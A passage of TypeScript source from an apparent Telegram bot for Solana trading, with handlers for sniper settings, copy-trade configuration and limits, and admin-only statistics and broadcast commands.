  | 'setting_take_profit'
  | 'setting_stop_loss';

const SNIPER_SETTING_PROMPTS: Record<SniperSettingState, { text: () => string; key: string }> = {
  setting_position_size: { text: msg.configPositionSizeMessage, key: 'positionSize' },
  setting_dev_hold: { text: msg.configDevHoldMessage, key: 'maxDevHold' },
  setting_slippage: { text: msg.configSlippageMessage, key: 'slippage' },
  setting_priority: { text: msg.configPriorityMessage, key: 'priorityFee' },
  setting_take_profit: { text: msg.configTakeProfitMessage, key: 'takeProfit' },
  setting_stop_loss: { text: msg.configStopLossMessage, key: 'stopLoss' },
};

export function sniperSettingPromptHandler(state: SniperSettingState) {
  return safeHandler(`nexo.sniper.${state}`, async (ctx) => {
    await answerCallback(ctx);
    await transition(ctx, state);
    await ctx.reply(SNIPER_SETTING_PROMPTS[state].text(), { reply_markup: kb.cancelButton() });
  });
}

export const sniperSettingValueHandler = safeHandler('nexo.sniper.setting.value', async (ctx) => {
  const state = ctx.session.state as SniperSettingState | undefined;
  if (!state || !SNIPER_SETTING_PROMPTS[state]) {
    await resetToIdle(ctx);
    return;
  }
  const text = ctx.message?.text?.trim();
  if (!text) return;
  const value = parseFloat(text);
  const ranges: Record<SniperSettingState, [number, number]> = {
    setting_position_size: [0.0001, 1000],
    setting_dev_hold: [0, 100],
    setting_slippage: [1, 50],
    setting_priority: [0.0001, 0.1],
    setting_take_profit: [10, 1000],
    setting_stop_loss: [10, 90],
  };
  const [min, max] = ranges[state];
  if (isNaN(value) || value < min || value > max) {
    await ctx.reply(`Invalid input. Range: ${min} - ${max}.`, { reply_markup: kb.cancelButton() });
    return;
  }
  const settings = await ctx.services.repos.updateSniperSettings(ctx.chat!.id, {
    [SNIPER_SETTING_PROMPTS[state].key]: value,
  } as Partial<Record<string, unknown>>);
  await resetToIdle(ctx);
  await ctx.reply(msg.settingUpdatedMessage(settings), { reply_markup: kb.backToSniperKeyboard() });
});

// ---------------------------------------------------------------------------
// Copy Trade
// ---------------------------------------------------------------------------

export const copyTradeHandler = safeHandler('nexo.copytrade', async (ctx) => {
  if (!(await requirePrivate(ctx))) return;
  await answerCallback(ctx);
  const records = await ctx.services.repos.getActiveWallets(ctx.chat!.id);
  if (records.length === 0) {
    await ctx.editMessageText(msg.copyTradeWalletRequiredMessage(), { reply_markup: kb.walletRequiredKeyboard() }).catch(() =>
      ctx.reply(msg.copyTradeWalletRequiredMessage(), { reply_markup: kb.walletRequiredKeyboard() }),
    );
    return;
  }
  const cfg = await ctx.services.repos.getCopyTrade(ctx.chat!.id);
  await ctx.editMessageText(msg.copyTradeMessage(cfg), { parse_mode: 'HTML', reply_markup: kb.copyTradeKeyboard(cfg.mode) }).catch(() =>
    ctx.reply(msg.copyTradeMessage(cfg), { parse_mode: 'HTML', reply_markup: kb.copyTradeKeyboard(cfg.mode) }),
  );
});

export const copyTradeStartHandler = safeHandler('nexo.copytrade.start', async (ctx) => {
  await answerCallback(ctx);
  const chatId = ctx.chat!.id;
  const current = await ctx.services.repos.getCopyTrade(chatId);
  if (!current.targetWallet) {
    await ctx.reply('Configure a target wallet first (🎯 Configure Target).', {
      reply_markup: kb.copyTradeKeyboard(current.mode),
    });
    return;
  }
  await ctx.services.repos.updateCopyTrade(chatId, { status: 'ACTIVE' });
  await ctx.reply(msg.copyTradeActivatedMessage(), { reply_markup: kb.copyTradeKeyboard(current.mode) });
  await ctx.services.notifier.event('copytrade_activated', { user: chatId, targetWallet: current.targetWallet });
});

export const copyTradeConfigurePromptHandler = safeHandler('nexo.copytrade.configure', async (ctx) => {
  await answerCallback(ctx);
  await transition(ctx, 'copytrade_add');
  await ctx.reply(msg.configureTargetWalletMessage(), { reply_markup: kb.cancelButton() });
});

export const copyTradeAddHandler = safeHandler('nexo.copytrade.add', async (ctx) => {
  const text = ctx.message?.text?.trim();
  if (!text) return;
  try {
    new PublicKey(text);
  } catch {
    await ctx.reply('Invalid Solana address.', { reply_markup: kb.cancelButton() });
    return;
  }
  const cfg = await ctx.services.repos.getCopyTrade(ctx.chat!.id);
  await ctx.services.repos.updateCopyTrade(ctx.chat!.id, { targetWallet: text });
  await resetToIdle(ctx);
  await ctx.reply(msg.copyTargetAddedMessage(text), { parse_mode: 'HTML', reply_markup: kb.copyTradeKeyboard(cfg.mode) });
  await ctx.services.notifier.event('copytrade_target_set', { user: ctx.chat!.id, targetWallet: text });
});

/** Toggles copy mode between Buy + Sell and Buy Only. */
export const copyTradeModeHandler = safeHandler('nexo.copytrade.mode', async (ctx) => {
  await answerCallback(ctx);
  const chatId = ctx.chat!.id;
  const current = await ctx.services.repos.getCopyTrade(chatId);
  const mode = current.mode === 'buy_only' ? 'buy_sell' : 'buy_only';
  await ctx.services.repos.updateCopyTrade(chatId, { mode });
  const cfg = await ctx.services.repos.getCopyTrade(chatId);
  await ctx.editMessageText(msg.copyTradeMessage(cfg), { parse_mode: 'HTML', reply_markup: kb.copyTradeKeyboard(cfg.mode) });
});

/** Starts the copy-trade limits wizard: max/trade -> max daily -> slippage -> token filter. */
export const copyTradeLimitsPromptHandler = safeHandler('nexo.copytrade.limits', async (ctx) => {
  await answerCallback(ctx);
  await transition(ctx, 'copytrade_limits', { limitsStep: 'max_per_trade' });
  await ctx.reply(msg.copyLimitsStepMessage('max_per_trade'), { reply_markup: kb.cancelButton() });
});

export const copyTradeLimitsValueHandler = safeHandler('nexo.copytrade.limits.value', async (ctx) => {
  const step = (ctx.session.payload as { limitsStep?: string }).limitsStep;
  const text = ctx.message?.text?.trim();
  if (!text || !step) return;
  const chatId = ctx.chat!.id;

  if (step === 'token_filter') {
    if (text.toUpperCase() !== 'ALL') {
      try {
        new PublicKey(text);
      } catch {
        await ctx.reply('Invalid token address — send a Solana mint address, or ALL.', { reply_markup: kb.cancelButton() });
        return;
      }
    }
    const filter = text.toUpperCase() === 'ALL' ? null : text;
    await ctx.services.repos.updateCopyTrade(chatId, { tokenFilter: filter });
    const cfg = await ctx.services.repos.getCopyTrade(chatId);
    await resetToIdle(ctx);
    await ctx.reply('✅ Copy trade limits saved.', { reply_markup: kb.copyTradeKeyboard(cfg.mode) });
    return;
  }

  const value = parseFloat(text);
  const isPct = step === 'slippage';
  if (isNaN(value) || value <= 0 || (isPct && (value < 1 || value > 50))) {
    await ctx.reply(isPct ? 'Invalid percentage (1-50).' : 'Invalid amount. Send a positive number.', { reply_markup: kb.cancelButton() });
    return;
  }

  const next: Record<string, { patch: Partial<Record<string, unknown>>; nextStep: string }> = {
    max_per_trade: { patch: { maxSolPerTrade: value }, nextStep: 'max_daily' },
    max_daily: { patch: { maxDailySol: value }, nextStep: 'slippage' },
    slippage: { patch: { slippage: value }, nextStep: 'token_filter' },
  };
  const current = next[step];
  await ctx.services.repos.updateCopyTrade(chatId, current.patch as Parameters<typeof ctx.services.repos.updateCopyTrade>[1]);
  await transition(ctx, 'copytrade_limits', { limitsStep: current.nextStep });
  await ctx.reply(msg.copyLimitsStepMessage(current.nextStep), { reply_markup: kb.cancelButton() });
});

// ---------------------------------------------------------------------------
// Admin-only commands
// ---------------------------------------------------------------------------

function isAdmin(ctx: BotContext): boolean {
  const chatId = ctx.chat?.id;
  return chatId !== undefined && ctx.services.config.ADMIN_IDS.includes(chatId);
}

export const statsHandler = safeHandler('nexo.admin.stats', async (ctx) => {
  if (!isAdmin(ctx)) {
    await ctx.reply('Admin only.');
    return;
  }
  const [users, tradesToday, depositsToday, walletRows] = await Promise.all([
    ctx.services.repos.countUsers(),
    ctx.services.repos.countTradesToday(),
    ctx.services.repos.countDepositsToday(),
    ctx.services.repos.allWallets(),
  ]);
  await ctx.reply(
    `BOT STATS\n\nUsers: ${users}\nWallets: ${walletRows.length}\nTrades (24h): ${tradesToday}\nDeposits (24h): ${depositsToday}\nNetwork: ${ctx.services.config.SOLANA_NETWORK}\nMainnet enabled: ${ctx.services.config.tradingAllowed ? 'yes' : 'no'}`,
  );
});

export const broadcastHandler = safeHandler('nexo.admin.broadcast', async (ctx, text: string) => {
  if (!isAdmin(ctx)) {
    await ctx.reply('Admin only.');
    return;
  }
  await resetToIdle(ctx);
  const chatIds = await ctx.services.repos.allUserChatIds();
  let sent = 0;
  let failed = 0;
  for (const chatId of chatIds) {
    try {
      await ctx.services.sendToUser(chatId, text);
      sent++;
    } catch {
      failed++;
    }
    await new Promise((r) => setTimeout(r, 50));
  }
  await ctx.reply(`Broadcast finished: ${sent} sent, ${failed} failed.`);
});
